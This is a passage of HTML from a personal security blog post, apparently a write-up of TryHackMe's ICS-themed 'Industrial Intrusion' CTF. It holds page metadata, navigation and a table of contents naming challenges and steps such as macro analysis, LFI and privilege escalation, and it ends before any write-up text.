<!doctype html>
<html
  lang="en"
  dir="ltr"
  class="scroll-smooth"
  data-default-appearance="dark"
  data-auto-appearance="true"><head>
  <meta charset="utf-8">
  
    <meta http-equiv="content-language" content="en">
  
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <meta name="theme-color">

  
  <title>Tryhackme Industrial Intrusion &middot; HushKat&#39;s Cyber Den</title>
    <meta name="title" content="Tryhackme Industrial Intrusion &middot; HushKat&#39;s Cyber Den">

  
  <meta name="description" content="Tryhackme Industrial Intrusion Writeups">
  <meta name="keywords" content="Web,Misc,OSINT,B2R,Boot2Root,Easy,Tryhackme,THM,Forensics,ICS,Industrial Control Systems,">
  
  
  <link rel="canonical" href="https://hushkat.github.io/posts/2025-06-30-industrial-intrusion.md/2025-06-30-industrial-intrusion/">
  
  
  
  
    
  
  
  
  
  
  
  
    
    
  
  
  <link
    type="text/css"
    rel="stylesheet"
    href="/css/main.bundle.min.f875dda8a6dc16f33adb8873681506c07444631be7e42b7575718d40698db0db7cd237ac4306f361ed9daaa2f828ff344a9fc7f845cf0217dcbc9360d395f0f9.css"
    integrity="sha512-&#43;HXdqKbcFvM624hzaBUGwHREYxvn5Ct1dXGNQGmNsNt80jesQwbzYe2dqqL4KP80Sp/H&#43;EXPAhfcvJNg05Xw&#43;Q==">

  
  
  <script
    type="text/javascript"
    src="/js/appearance.min.516a16745bea5a9bd011138d254cc0fd3973cd55ce6e15f3dec763e7c7c2c7448f8fe7b54cca811cb821b0c7e12cd161caace1dd794ac3d34d40937cbcc9ee12.js"
    integrity="sha512-UWoWdFvqWpvQERONJUzA/TlzzVXObhXz3sdj58fCx0SPj&#43;e1TMqBHLghsMfhLNFhyqzh3XlKw9NNQJN8vMnuEg=="></script>
  
  
  
  
    
    
    
  
  
    
    
  
  
  
  
  
  
  
  
  
    
    <script
      defer
      type="text/javascript"
      id="script-bundle"
      src="/js/main.bundle.min.f99aa39bcfb5d16a28ec2236bd358df5e465058a67f58b42534a3b15882a6a3513791fd27248c6b5b5cef06337f714070d4784fb776f44d930309b64cce1a2e0.js"
      integrity="sha512-&#43;Zqjm8&#43;10Woo7CI2vTWN9eRlBYpn9YtCU0o7FYgqajUTeR/SckjGtbXO8GM39xQHDUeE&#43;3dvRNkwMJtkzOGi4A=="
      data-copy="Copy"
      data-copied="Copied"></script>
  
  
    
    <script src="/lib/zoom/zoom.min.umd.a527109b68c082a70f3697716dd72a9d5aa8b545cf800cecbbc7399f2ca6f6e0ce3e431f2062b48bbfa47c9ea42822714060bef309be073f49b9c0e30d318d7b.js" integrity="sha512-pScQm2jAgqcPNpdxbdcqnVqotUXPgAzsu8c5nyym9uDOPkMfIGK0i7&#43;kfJ6kKCJxQGC&#43;8wm&#43;Bz9JucDjDTGNew=="></script>
  

  
  
    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">
  

  
  
  
  
  
  

  
  <meta property="og:url" content="https://hushkat.github.io/posts/2025-06-30-industrial-intrusion.md/2025-06-30-industrial-intrusion/">
  <meta property="og:site_name" content="HushKat&#39;s Cyber Den">
  <meta property="og:title" content="Tryhackme Industrial Intrusion">
  <meta property="og:description" content="Tryhackme Industrial Intrusion Writeups">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2025-06-30T01:09:33+03:00">
    <meta property="article:modified_time" content="2025-06-30T01:09:33+03:00">
    <meta property="article:tag" content="Web">
    <meta property="article:tag" content="Misc">
    <meta property="article:tag" content="Osint">
    <meta property="article:tag" content="B2R">
    <meta property="article:tag" content="Boot2root">
    <meta property="article:tag" content="Easy">

  
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="Tryhackme Industrial Intrusion">
  <meta name="twitter:description" content="Tryhackme Industrial Intrusion Writeups">

  <script type="application/ld+json">
  [{
    "@context": "https://schema.org",
    "@type": "Article",
    "articleSection": "Posts",
    "name": "Tryhackme Industrial Intrusion",
    "headline": "Tryhackme Industrial Intrusion",
    "description": "Tryhackme Industrial Intrusion Writeups",
    "abstract": "\u003cblockquote\u003e\n\u003cp\u003eOver the weekend, I took on the challenge to participate in Industrial Intrusion CTF by TryHackMe, it was a challenge that blends classic offensive security tactics with the niche world of Industrial Control Systems (ICS).\nIt offered a fun and insightful mix of categories including Web exploitation, OSINT, Forensics, and a light Boot2Root (B2R) experienceâ€\u0026ldquo;perfect for anyone looking to dip their toes into ICS-focused challenges.\nThese writeups walk through my step-by-step approach in solving some of the easiest challenges, how I navigated each section, and what made this ICS-themed room both accessible and educational.\nWhether you\u0026rsquo;re new to TryHackMe or curious about the crossover between IT and OT security, this is a solid place to start.\u003c\/p\u003e",
    "inLanguage": "en",
    "url" : "https:\/\/hushkat.github.io\/posts\/2025-06-30-industrial-intrusion.md\/2025-06-30-industrial-intrusion\/",
    "author" : {
      "@type": "Person",
      "name": ""
    },
    "copyrightYear": "2025",
    "dateCreated": "2025-06-30T01:09:33\u002b03:00",
    "datePublished": "2025-06-30T01:09:33\u002b03:00",
    
    "dateModified": "2025-06-30T01:09:33\u002b03:00",
    
    "keywords": ["Web","Misc","OSINT","B2R","Boot2Root","Easy","Tryhackme","THM","Forensics","ICS","Industrial Control Systems"],
    
    "mainEntityOfPage": "true",
    "wordCount": "3177"
  }]
  </script>



  
  
  

  
  

<script src="/lib/jquery/jquery.slim.min.b0dca576e87d7eaa5850ae4e61759c065786cdb6489d68fcc82240539eebd5da522bdb4fda085ffd245808c8fe2acb2516408eb774ef26b5f6015fc6737c0ea8.js" integrity="sha512-sNylduh9fqpYUK5OYXWcBleGzbZInWj8yCJAU57r1dpSK9tP2ghf/SRYCMj&#43;KsslFkCOt3TvJrX2AV/Gc3wOqA=="></script>


























  

  

  

  

  





  
  





  
  

  
  

  
  

  
  
</head>
<body
    class="flex flex-col h-screen px-6 m-auto text-lg leading-7 max-w-7xl bg-neutral text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32 scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600">
    <div id="the-top" class="absolute flex self-center">
      <a
        class="px-3 py-1 text-sm -translate-y-8 rounded-b-lg bg-primary-200 focus:translate-y-0 dark:bg-neutral-600"
        href="#main-content">
        <span class="font-bold text-primary-600 pe-2 dark:text-primary-400">&darr;</span>
        Skip to main content
      </a>
    </div>
    
    
      













<div
  class="main-menu flex items-center justify-between px-4 py-6 sm:px-6 md:justify-start gap-x-3 pt-[2px] pr-0 pb-[3px] pl-0">
  
  
    
    

  <div class="flex flex-1 items-center justify-between">
    <nav class="flex space-x-3">
      
        <a href="/" class="text-base font-medium">
          HushKat&rsquo;s Cyber Den
        </a>
      
    </nav>
    
  <nav class="hidden md:flex items-center gap-x-5 md:ml-12 h-12">
    
      
        
  <a
  href="/posts/"
  
  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Posts">
    Blog
  </p>
</a>



      
        
  <a
  href="/categories/"
  
  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Categories">
    Categories
  </p>
</a>



      
        
  <a
  href="/tags/"
  
  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="Tags">
    Tags
  </p>
</a>



      
        
  <a
  href="/about/"
  
  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
  
  <p class="text-base font-medium" title="About">
    About
  </p>
</a>



      
        
  <a
  href="https://twitter.com/dr0idbot"
  target="_blank"
  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
  
    <span >
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
    </span>
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



      
        
  <a
  href="https://github.com/hushkat"
  target="_blank"
  class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
  
    <span >
      <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span>
    </span>
  
  <p class="text-base font-medium" title="">
    
  </p>
</a>



      
    

    

    

    
      <button
        id="search-button"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
      <div class=" flex items-center">
        <button
          id="appearance-switcher"
          aria-label="Dark mode switcher"
          type="button"
          class="text-base hover:text-primary-600 dark:hover:text-primary-400">
          <div class="flex items-center justify-center dark:hidden">
            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
          </div>
          <div class="items-center justify-center hidden dark:flex">
            <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
          </div>
        </button>
      </div>
    
  </nav>

    
  <div class="flex md:hidden items-center gap-x-5 md:ml-12 h-12">
    <span></span>

    

    

    
      <button
        id="search-button-mobile"
        aria-label="Search"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400"
        title="Search (/)">
        <span class="relative block icon"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span>
      </button>
    

    
      <button
        id="appearance-switcher-mobile"
        aria-label="Dark mode switcher"
        type="button"
        class="text-base hover:text-primary-600 dark:hover:text-primary-400 me-1">
        <div class="flex items-center justify-center dark:hidden">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>
</span>
        </div>
        <div class="items-center justify-center hidden dark:flex">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>
</span>
        </div>
      </button>
    
  </div>

  </div>
  
  <div class="-my-2 md:hidden">
    <div id="menu-button" class="block">
      
        <div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400">
          <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416C433.7 64 448 78.33 448 96C448 113.7 433.7 128 416 128H32C14.33 128 0 113.7 0 96zM0 256C0 238.3 14.33 224 32 224H416C433.7 224 448 238.3 448 256C448 273.7 433.7 288 416 288H32C14.33 288 0 273.7 0 256zM416 448H32C14.33 448 0 433.7 0 416C0 398.3 14.33 384 32 384H416C433.7 384 448 398.3 448 416C448 433.7 433.7 448 416 448z"/></svg>
</span>
        </div>
        <div
          id="menu-wrapper"
          class="fixed inset-0 z-30 invisible w-screen h-screen m-0 overflow-auto transition-opacity opacity-0 cursor-default bg-neutral-100/50 backdrop-blur-sm dark:bg-neutral-900/50 pt-[5px]">
          <ul
            class="flex space-y-2 mt-3 flex-col items-end w-full px-6 py-6 mx-auto overflow-visible list-none text-end max-w-7xl">
            <li id="menu-close-button">
              <span
                class="cursor-pointer inline-block align-text-bottom hover:text-primary-600 dark:hover:text-primary-400">
                <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>
</span>
              </span>
            </li>

            
              
  <li class="mt-1">
  <a
    href="/posts/"
    
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Posts">
      Blog
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/categories/"
    
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Categories">
      Categories
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/tags/"
    
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="Tags">
      Tags
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="/about/"
    
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
    
    <p class="text-bg font-bg" title="About">
      About
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="https://twitter.com/dr0idbot"
    
      target="_blank"
    
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
    
      <div >
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M389.2 48h70.6L305.6 224.2 487 464H345L233.7 318.6 106.5 464H35.8L200.7 275.5 26.8 48H172.4L272.9 180.9 389.2 48zM364.4 421.8h39.1L151.1 88h-42L364.4 421.8z"/></svg></span>
      </div>
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>



            
              
  <li class="mt-1">
  <a
    href="https://github.com/hushkat"
    
      target="_blank"
    
    class="flex items-center hover:text-primary-600 dark:hover:text-primary-400">
    
      <div >
        <span class="relative block icon"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
</span>
      </div>
    
    <p class="text-bg font-bg" title="">
      
    </p>
  </a>
</li>



            

          </ul>
          
        </div>
      
    </div>
  </div>

</div>





    
    <div class="relative flex flex-col grow">
      <main id="main-content" class="grow">
        
  
  <article>
    
    
      
      
      
      
        



    <div id="hero" class="h-[150px] md:h-[200px]"></div>
  
  <div class="fixed inset-x-0 top-0 h-[800px] single_hero_background nozoom">
    
    
      
    
    <img
      id="background-image"
      src="/industrial-intrusion-meta_14715585922730729588_hu_bad8e0696045b4b4.png"
      alt="Background Image"
      class="absolute inset-0 w-full h-full object-cover">
    <div
      class="absolute inset-0 bg-gradient-to-t from-neutral dark:from-neutral-800 to-transparent mix-blend-normal"></div>
    <div
      class="absolute inset-0 opacity-60 bg-gradient-to-t from-neutral dark:from-neutral-800 to-neutral-100 dark:to-neutral-800 mix-blend-normal"></div>
  </div>

  
    <div
      id="background-blur"
      class="fixed opacity-0 inset-x-0 top-0 h-full single_hero_background nozoom backdrop-blur-2xl"></div>
    
    
    <script
      type="text/javascript"
      src="/js/background-blur.min.00a57c73ea12f2cab2980c3c3d649e89f6d82f190f74bbe2b67f2f5e39ab7d032ece47086400ca05396758aace13299da49aca43ea643d2625e62c506267a169.js"
      integrity="sha512-AKV8c&#43;oS8sqymAw8PWSeifbYLxkPdLvitn8vXjmrfQMuzkcIZADKBTlnWKrOEymdpJrKQ&#43;pkPSYl5ixQYmehaQ=="
      data-blur-id="background-blur"
      data-image-id="background-image"
      data-image-url="/industrial-intrusion-meta_14715585922730729588.png"></script>
  
      
    

    
    <header id="single_header" class="mt-5 max-w-prose">
      
      <h1 class="mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">
        Tryhackme Industrial Intrusion
      </h1>
      <div class="mt-1 mb-6 text-base text-neutral-500 dark:text-neutral-400 print:hidden">
        





  
  



  

  
  
  

  
  
    
  

  
    
  

  

  
    
  

  
    
  

  

  

  

  

  


  <div class="flex flex-row flex-wrap items-center">
    
    
      <time datetime="2025-06-30T01:09:33&#43;03:00">30 June 2025</time><span class="px-2 text-primary-500">&middot;</span><span>3177 words</span><span class="px-2 text-primary-500">&middot;</span><span title="Reading time">15 mins</span>
    

    
    
  </div>

  

  
  

  
  



      </div>
      
        
  
  
  
  
  
  

  

  
    
    
<div class="flex author">
  
  <div class="place-self-center">
    
    
    <div class="text-2xl sm:text-lg">
</div>
  </div>
</div>

  

  

  
    <div class="mb-5"></div>
  

      
    </header>

    
    <section class="flex flex-col max-w-full mt-0 prose dark:prose-invert lg:flex-row">
      
      
      
      
      
      
        <div class="order-first lg:ml-auto px-0 lg:order-last lg:ps-8">
          <div class="toc ps-5 print:hidden lg:sticky lg:top-10">
            
              <details
  open
  id="TOCView"
  class="toc-right mt-0 overflow-y-auto overscroll-contain scrollbar-thin scrollbar-track-neutral-200 scrollbar-thumb-neutral-400 dark:scrollbar-track-neutral-800 dark:scrollbar-thumb-neutral-600 rounded-lg -ms-5 ps-5 pe-2 hidden lg:block">
  <summary
    class="block py-1 text-lg font-semibold cursor-pointer bg-neutral-100 text-neutral-800 -ms-5 ps-5 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">
    Table of Contents
  </summary>
  <div
    class="min-w-[220px] py-2 border-dotted border-s-1 -ms-5 ps-5 dark:border-neutral-600">
    <nav id="TableOfContents">
  <ul>
    <li><a href="#breach">Breach</a></li>
    <li><a href="#discord">Discord</a>
      <ul>
        <li><a href="#description">Description</a></li>
        <li><a href="#step-1-following-the-trail-from-the-channel-description">Step 1: Following the Trail from the Channel Description</a></li>
        <li><a href="#step-2-executing-the-secret-function">Step 2: Executing the Secret Function</a></li>
      </ul>
    </li>
    <li><a href="#rogue-poller">Rogue Poller</a>
      <ul>
        <li><a href="#description-1">Description</a></li>
        <li><a href="#why-port-502">Why port 502?</a></li>
        <li><a href="#reassemble-the-conversation">Re‑assemble the conversation</a></li>
      </ul>
    </li>
    <li><a href="#osint-1">OSINT 1</a>
      <ul>
        <li><a href="#description-2">Description</a></li>
        <li><a href="#objective">Objective</a></li>
        <li><a href="#approach">Approach</a></li>
        <li><a href="#findings">Findings</a></li>
        <li><a href="#analysis">Analysis</a></li>
      </ul>
    </li>
    <li><a href="#osint-2">OSINT 2</a>
      <ul>
        <li><a href="#description-3">Description</a></li>
        <li><a href="#investigation-steps">Investigation Steps</a></li>
        <li><a href="#1-visited">1. <strong>Visited <code>stage0.virelia-water.it.com</code></strong></a></li>
        <li><a href="#2-analyzed-initjs">2. Analyzed <code>init.js</code></a></li>
        <li><a href="#3-queried-the-fallback-subdomain">3. Queried the Fallback Subdomain</a></li>
      </ul>
    </li>
    <li><a href="#orcam">ORCAM</a>
      <ul>
        <li><a href="#description-4">Description</a></li>
        <li><a href="#objective-1">Objective</a></li>
        <li><a href="#step-1-analyzing-the-email-writing_templateeml">Step 1: Analyzing the Email (Writing_Template.eml)</a></li>
        <li><a href="#observations">Observations</a></li>
        <li><a href="#step-2-extracting-the-malicious-macro">Step 2: Extracting the Malicious Macro</a></li>
        <li><a href="#key-findings-in-the-macro">Key Findings in the Macro:</a></li>
        <li><a href="#step-3-decrypting-the-shellcode">Step 3: Decrypting the Shellcode</a></li>
        <li><a href="#python-decryption-script">Python Decryption Script:</a></li>
        <li><a href="#output-analysis">Output Analysis</a></li>
        <li><a href="#summary-of-the-investigation">Summary of the Investigation</a></li>
      </ul>
    </li>
    <li><a href="#chess-industry">Chess Industry</a>
      <ul>
        <li><a href="#description-5">Description</a></li>
        <li><a href="#step-1-reconnaissance-port-scanning">Step 1: Reconnaissance (Port Scanning)</a></li>
        <li><a href="#nmap-scan">Nmap Scan</a></li>
        <li><a href="#step-2-web-enumeration">Step 2: Web Enumeration</a></li>
        <li><a href="#key-observations">Key Observations</a></li>
        <li><a href="#step-3-exploiting-the-finger-service-port-79">Step 3: Exploiting the Finger Service (Port 79)</a></li>
        <li><a href="#what-is-the-finger-protocol">What is the Finger Protocol?</a></li>
        <li><a href="#why-was-it-dangerous">Why Was It Dangerous?</a></li>
        <li><a href="#enumerate-users">Enumerate Users</a></li>
        <li><a href="#step-4-initial-foothold-via-ssh">Step 4: Initial Foothold via SSH</a></li>
        <li><a href="#step-5-privilege-escalation">Step 5: Privilege escalation</a></li>
        <li><a href="#attack-path-summary">Attack Path Summary</a></li>
      </ul>
    </li>
    <li><a href="#under-construction">Under Construction</a>
      <ul>
        <li><a href="#description-6">Description</a></li>
        <li><a href="#step-1-reconnaissance-port-scanning-with-nmap">Step 1: Reconnaissance (Port Scanning with Nmap)</a></li>
        <li><a href="#web-enumeration">Web Enumeration</a></li>
        <li><a href="#step-2-exploiting-lfi-local-file-inclusion">Step 2: Exploiting LFI (Local File Inclusion)</a></li>
        <li><a href="#step-3-finding-ssh-keysexploring-keys-directory">Step 3: Finding SSH Keys(Exploring <code>/keys/</code> Directory)</a></li>
        <li><a href="#ssh-access">SSH Access</a></li>
        <li><a href="#step-4-privilege-escalation-checking-sudo-permissions">Step 4: Privilege Escalation (Checking Sudo Permissions)</a></li>
        <li><a href="#escalating-to-root-via-vi">Escalating to Root via <code>vi</code></a></li>
